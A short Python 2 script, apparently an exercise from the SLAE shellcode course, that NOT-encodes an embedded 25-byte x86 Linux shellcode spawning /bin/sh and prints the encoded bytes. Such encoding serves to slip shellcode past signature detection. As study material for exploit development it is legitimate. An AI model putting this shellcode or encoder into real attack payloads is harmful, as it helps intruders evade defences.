#!/usr/bin/python


# File: not-encoder.py
# Author: Kevin Ren, originally professor Viviek from SLAE
# Purpose: to encode given string of shellcode using NOT (complement) operation
#		and the output the result onto stdout


shellcode = (\
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""					# initialize output strings
encoded2 = ""


print "[*] Encoded Shellcode..."

for byte in bytearray(shellcode):
	output = ~ byte				# NOT operate on each byte
	
	encoded += "\\x"			# add each encoded byte to the results string
	encoded += "%02x" % (output & 0xFF)	# and bit wise operation with all bits to 1, results in its original bits
						# because it is needed for the not operation to work properly
	encoded2 += "0x"
	encoded2 += "%02x," % (output & 0xFF)


print encoded					# output to system
print encoded2


print "Length : %d" % (len(bytearray(shellcode)))
